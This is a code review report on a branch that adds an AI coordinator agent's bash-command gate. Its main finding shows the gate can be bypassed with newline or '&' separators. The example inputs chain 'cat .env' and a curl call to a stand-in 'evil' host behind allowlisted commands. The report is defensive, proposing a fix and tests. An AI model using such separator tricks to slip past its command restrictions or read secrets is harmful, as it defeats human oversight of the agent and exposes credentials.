# Code Review — `feature/veles-planning-agent`

**Date:** 2026-05-31
**Scope:** `4fc78588..HEAD` — 47 commits, 91 files (+4798/−449). Two features: the **Veles planning agent** and the **coordinator-policy layer** (runtime bash gate + skill-injection suppression for Perun). `dist/` excluded (generated; verified in sync). Stack: TypeScript/Bun, no React/Python/PHP.
**Method:** 3 parallel auditors (security, code-quality, documentation) + own performance/architecture pass + Cross-Verifier + Challenger.

**Verdict: SHIP after fixing SEC-001.** The Veles feature and most of the coordinator-policy layer are high-quality, well-tested, and faithful to their specs. One material issue (the bash rail's compound check is trivially bypassable) plus documentation drift to fix in the same PR. Everything else is LOW polish.

**Toolchain (run live):** typecheck ✅ clean · full test suite ✅ green (root + 6 packages, incl. new `injection-suppression`/`bash-gate`/Veles suites) · `dist/` ✅ in sync · eslint: 4 errors, **all pre-existing/environmental — zero introduced by this branch** (verified vs base: `skill-registry` `config: any` predates the branch; the other three are a nested `.worktrees/` checkout + an untouched test file).

| Severity | Count |
|----------|-------|
| HIGH | 1 |
| MEDIUM | 4 |
| LOW | 5 |

---

## HIGH

### [HIGH] SEC-001: Coordinator bash gate bypassed by newline / single-`&` separators
**Status:** ✅ Fixed (2026-05-31)

**ID:** SEC-001
**Location:** `packages/skill-utils/src/coordinator-bash-policy.ts:16` (the `COMPOUND` regex), consumed at `src/modules/coordinator-policy/index.ts:22-23`
**Category:** Security
**CWE:** CWE-78 / CWE-184 (Incomplete List of Disallowed Inputs)
**OWASP:** A01:2025, A05:2025
**Effort:** easy

**Problem.** The gate allows the coordinator's declared programs (`mkdir`, `ls`, `./scripts/qa-preflight.sh`) and is supposed to reject compounds. `classifyCoordinatorBash` runs `COMPOUND` and, if it doesn't match, allowlist-checks only `command.split(/\s+/)[0]`. The regex catches `|| && ; | ` + "`" + ` $(` and `bash/sh/eval` — but **not `\n`, `\r\n`, or a single `&`**. Because `\s` includes newlines, the parsed "program" is the harmless first token while the shell still runs the second statement. Empirically confirmed against the real allowlist:

| Command handed to the gate | Verdict | What the shell runs |
|---|---|---|
| `ls docs\ncat .env` | **ALLOW** (prog=`ls`) | `ls`, then `cat .env` |
| `ls\ngit log --all` | **ALLOW** | `ls`, then `git log` |
| `mkdir x\ncurl http://evil` | **ALLOW** | `mkdir`, then `curl` |
| `ls & git diff` | **ALLOW** | `ls`, then `git diff` |

**Impact.** This is the branch's headline control, built to stop exactly the incident in the spec (Perun-on-Kimi running `git status/log/diff`). The design **promises** compound rejection as a hard requirement (`design.md:186`, `:273`) and a test enshrines `&&`/`;` (`coordinator-bash-policy.test.ts:28-32`) — but the simplest possible input (a newline, or `&`) defeats it. HIGH sustained by the Challenger: a defense-in-depth control bypassed by pressing Enter provides essentially zero residual value against the weak/injected-model threat it was built for. This does **not** invalidate the earlier smoke test — bare `git status` is still correctly blocked (git isn't token[0]-allowlisted); the smoke simply never exercised the `ls\n…` prefix.

**Remediation.** Reject the compound *class* properly — add the missing separators (and redirection), and ideally tokenize/scan every statement the way the sibling commit gate does (`src/modules/commit/bash-policy.ts:49-52` scans all tokens, not just token[0]). Minimal regex fix:

```ts
// Newline, CR, single & and redirection are shell separators just like ; and && —
// without them `ls\ngit log`, `ls & curl …`, `ls > /tmp/x` slip a forbidden
// command/redirect past the token[0]-only program check.
const COMPOUND =
  /(\|\||&&|;|\||&|[\r\n]|`|\$\(|<|>|(?<![\w./-])(?:bash|sh|eval)\b)/
```

Add table-driven negative tests to `coordinator-bash-policy.test.ts` for `ls\ngit log`, `mkdir x\ncurl http://e`, `ls & git diff`, `ls\r\ncurl x`, `ls > /tmp/x` — none are exercised today, which is why CI is green despite the bypass. Acceptance bar: every `COMPOUND` alternation has a passing reject test.

---

## MEDIUM

### [MEDIUM] DOC-001: `coordinator.md:140` still claims a "runtime gate" rejects MCP tools
**Status:** ✅ Fixed (2026-05-31)

**ID:** DOC-001
**Location:** `docs/plugins/coordinator.md:140`
**Category:** Documentation
**Effort:** trivial

**Problem.** Line 140 says MCP tools (`serena_*`, `playwright_*`) "are not in `allowed-tools` and the runtime gate rejects them." This is the exact false runtime-enforcement claim the branch already retired in `src/agents/perun.md:32`. The bash gate intercepts only `tool === "bash"` (`coordinator-policy/index.ts:18`); MCP tool names never reach it, and Perun's `tools` override (`coordinator/index.ts:368`) disables only `skill`/`load_appverk_skill` (partial override — MCP stays enabled). No code path rejects MCP for the coordinator. *(Challenger adjusted HIGH→MEDIUM: real inconsistency, but an accuracy gap that does not itself create a vulnerability.)*

**Remediation.** Mirror the corrected `perun.md:32` prose: MCP tools are excluded via `allowed-tools` and must not be used; runtime rejection is **not** guaranteed by the bash gate — if one ever bubbles up, surface it verbatim.

### [MEDIUM] DOC-002: Security-model table omits the new code-enforced bash rail; mislabels it LLM-requested
**Status:** ✅ Fixed (2026-05-31)

**ID:** DOC-002
**Location:** `docs/plugins/coordinator.md:281-313` (mislabel at `:302`)
**Category:** Documentation
**Effort:** easy

**Problem.** The "code-enforced vs LLM-requested" table is the authoritative posture reference. It has no row for the coordinator bash rail, the `tools:{skill:false}` gating, or the injection suppression — and row `:302` still files the bash hard-rule ("no `Bash(curl/psql/docker/...)`") entirely under LLM-requested, though the bash subset is now code-enforced. (Row `:311` documents the *commit* rail but not the coordinator one — confirming a genuine omission.) *(Challenger adjusted HIGH→MEDIUM, same calibration as DOC-001.)*

**Remediation.** Add a code-enforced row for the coordinator bash rail (source `src/modules/coordinator-policy/` + `coordinator-bash-policy.ts`; state it is **fail-open** and, after SEC-001, note its bypass surface), plus rows for skill-tool gating and injection suppression. Re-scope `:302` so the bash channel is attributed to code, leaving only the prose-only parts (dotfile `Read`s, credential discipline) under LLM-requested.

### [MEDIUM] DOC-003: `AGENTS.md` monorepo-layout table missing the new module + skill-utils primitives
**Status:** ✅ Fixed (2026-05-31)

**ID:** DOC-003
**Location:** `AGENTS.md:9-24` (layout table), `:14` (skill-utils row)
**Category:** Documentation
**Effort:** easy

**Problem.** AGENTS.md's own Documentation Checklist designates the layout table as the home for "plumbing." This branch added the `src/modules/coordinator-policy/` module and two exported primitives (`session-identity.ts`, `coordinator-bash-policy.ts`) in `packages/skill-utils`, but none appears in the table — and the design rationale lives only in the superpowers spec, which the project explicitly archives. The durable record required by its own rules is missing.

**Remediation.** Add a `coordinator-policy/` row (its `tool.execute.before` bash gate, fail-open on identity uncertainty, allowlist read from `perun.md` frontmatter with hardcoded fallback) and extend the `skill-utils` row to cover the stateless resolver + bash-policy primitives and **both** consumers (`coordinator-policy` gate + `skill-registry` transform).

### [MEDIUM] MAINT-001: `read-allowlist.ts` has no test; its "Task-7 sync test" comment misattributes coverage
**Status:** ✅ Fixed (2026-05-31)

**ID:** MAINT-001
**Location:** `src/modules/coordinator-policy/read-allowlist.ts:11,16-31`
**Category:** Maintainability
**Effort:** easy

**Problem.** No test imports `readCoordinatorBashAllowlist`; neither the happy path, the catch→`FALLBACK_ALLOWLIST` branch, nor the empty-parse branch is covered. The referenced "Task-7 sync test" (`coordinator-name-sync.test.ts`) only guards `COORDINATOR_AGENT_NAME` against the agent **key** — it does *not* guard the allowlist against `perun.md` frontmatter drift, as the comment at `:11` claims. `bash-gate.test.ts` injects a hardcoded allowlist (bypassing the reader); `coordinator-bash-policy.test.ts` tests the parser against a literal string. Because the gate **fails open**, a regression here silently turns the gate into a no-op.

**Remediation.** Add direct tests for `readCoordinatorBashAllowlist` (real-`perun.md` happy path asserting `["mkdir","ls","./scripts/qa-preflight.sh"]` and **not** `git`; catch→fallback; empty→fallback), plus a genuine `FALLBACK_ALLOWLIST`↔frontmatter sync test. Then make the `:11` comment point at a real test or remove it.

---

## LOW

### [LOW] SEC-002: Violation-error subject names only the first token of a multi-line command
**Status:** ✅ Fixed (2026-05-31)

**ID:** SEC-002 · **Location:** `packages/skill-utils/src/coordinator-bash-policy.ts:44` · **Category:** Security (CWE-117) · **Effort:** trivial
`buildViolationError` derives the displayed subject via `command.split(/\s+/)[0]`, so a multi-line rejection can misname the program in the `COORDINATOR_POLICY_VIOLATION` telemetry the eval counts. Largely mooted once SEC-001 is fixed; optionally set the subject to "a compound command" when the reason is a compound separator.

### [LOW] DOC-004: "The coordinator is registered last" is now literally false
**Status:** ✅ Fixed (2026-05-31)

**ID:** DOC-004 · **Location:** `AGENTS.md:219` · **Category:** Documentation · **Effort:** trivial
`AppVerkCoordinatorPolicyPlugin` registers after the coordinator in `src/index.ts:31-33`. The underlying invariant (agent-registering modules before the coordinator) still holds; reword to "registered after every agent-registering module (non-agent plugins like `coordinator-policy` may follow it)."

### [LOW] PERF-001: Per-bash-call full-transcript fetch in the gate
**Status:** ✅ Fixed (2026-05-31)

**ID:** PERF-001 · **Location:** `src/modules/coordinator-policy/index.ts:20` → `packages/skill-utils/src/session-identity.ts:24-32` · **Category:** Performance · **Effort:** easy
`makeBashGate` calls `getSessionAgent` on **every** bash invocation in every session; `getSessionAgent` does `client.session.messages` (fetches the whole transcript) to read one immutable field. Same call is in skill-registry's `transform` (once/turn). *(Challenger adjusted MEDIUM→LOW: localhost IPC on an infrequent path; real but bounded.)* Fix: memoize agent identity per `sessionID` (immutable for the session; cache only resolved values so the turn-1 unresolved window can still resolve later), shared by both consumers.

### [LOW] MAINT-002: `getSessionParentID` is dead code in the shipped path
**Status:** ✅ Fixed (2026-05-31)

**ID:** MAINT-002 · **Location:** `packages/skill-utils/src/session-identity.ts:13-21` · **Category:** Maintainability · **Effort:** trivial
The path-A design keys only on `getSessionAgent`; `getSessionParentID` is exported+tested but has no production caller (it was the path-B fallback). Either drop it (YAGNI) or add a one-line "reserved for the deferred intent gate" doc comment.

### [LOW] MAINT-003: `isCoordinatorSession` exists but both call sites inline the comparison
**Status:** ✅ Fixed (2026-05-31)

**ID:** MAINT-003 · **Location:** `packages/skill-utils/src/session-identity.ts:36-38` (vs `coordinator-policy/index.ts:20`, `skill-registry/src/index.ts:65`) · **Category:** Maintainability · **Effort:** trivial
Both production sites duplicate `getSessionAgent(...) === COORDINATOR_AGENT_NAME` instead of the purpose-built tested predicate. Route both through `isCoordinatorSession` (DRY) or drop it.

---

## What's clean (verified, no findings)

- **Secrets** (trufflehog, 0) · **dependencies** (bun audit, 0; the new `@appverk/opencode-skill-utils` dep is a local workspace package, no supply-chain risk) · **SAST** (semgrep, 0 in scope).
- **Anti-recursion dispatch guard** (`dispatch.ts:74-94`) — exercised across all caller/target modes: `primary→Veles` allowed; `*→Perun`, `Veles→Veles`, non-allowlisted `all`, caller-mode-omitted all correctly blocked/closed. `DISPATCHABLE_ALL_AGENTS` pinned to `VELES_AGENT_KEY` by a drift test.
- **Fail-open (bash) / fail-closed (injection) directions** correct per lever and both tested. **Identity resolution** not spoofable from within a coordinator turn.
- **packages↔src boundary** clean (no `src/` imports from packages; shared code correctly packaged) · **SOLID / naming / DRY-YAGNI** clean · **Veles caller-mode threading** clean and well-tested.
- **Packaging:** `read-allowlist.ts` resolves `dist/agents/perun.md`, which **is** shipped (`package.json files: ["dist"]`) — production will not silently fall back to the hardcoded allowlist.
- **Veles feature** (prompt, allowed-tools, metadata, qa-plan-authoring skill, thin `/create-qa-plan` wrapper) — no documentation defects; specs/plans/eval scenarios verified accurate against the code.

---

## Verification Summary

**Method:** Cross-domain correlation (Cross-Verifier) + adversarial review (Challenger), both run against source.

| Metric | Count |
|--------|-------|
| Findings verified | 10 |
| False positives removed | 0 |
| Severity adjustments | 3 |
| Cross-analysis composites | 2 (+6 correlations, 4 coverage gaps) |

**Challenged findings (adjustments applied):**
- **SEC-001** — sustained **HIGH** (defeats a spec-promised, test-enshrined contract with trivial input).
- **DOC-001, DOC-002** — **HIGH → MEDIUM** (real accuracy gaps in a security-posture doc, but non-functional; must not outrank the security finding).
- **PERF-001 (Q2)** — **MEDIUM → LOW** (localhost IPC, infrequent path; memoization fix confirmed safe).
- **MAINT-001 (Q1)** — confirmed **MEDIUM**.
- No findings rejected as false positives.

**Cross-Analysis (Security ↔ Quality ↔ Documentation):**
- **COMPOSITE-1 [HIGH] — The coordinator bash rail is bypassable, untested-against-its-bypass, fail-open, and misdocumented at once.** SEC-001 lets a forbidden second command run; the tests don't cover the separators that defeat it (MAINT-001); the reader fails open so a parse error disables the rail entirely; and the docs both hide the rail (DOC-002) and over-claim MCP enforcement (DOC-001). Fix all four in one PR.
- **COMPOSITE-2 [MEDIUM] — `session-identity.ts` is a hot-path cost, an undocumented module, and the single trigger for both coordinator controls.** A single identity-resolution change could silently disable the bash gate (fails open) *and* re-enable skill injection into the coordinator. Memoize once in the primitive, route both sites through `isCoordinatorSession`, document it in AGENTS.md (folds in PERF-001, MAINT-002/003, DOC-003).
- **Coverage gap:** redirection operators (`<` `>` `>>`) on allowlisted programs were not separately audited — fold into the SEC-001 regex fix.

---

## Suggested fix sequencing

1. **One PR (the headline fix):** SEC-001 regex + negative tests · DOC-001 + DOC-002 doc corrections · MAINT-001 reader tests + sync test. (COMPOSITE-1.)
2. **Follow-up polish:** PERF-001 memoization in `session-identity.ts` + MAINT-003 (route through `isCoordinatorSession`) + MAINT-002 + DOC-003 AGENTS.md rows. (COMPOSITE-2.)
3. **Trivial:** DOC-004, SEC-002.
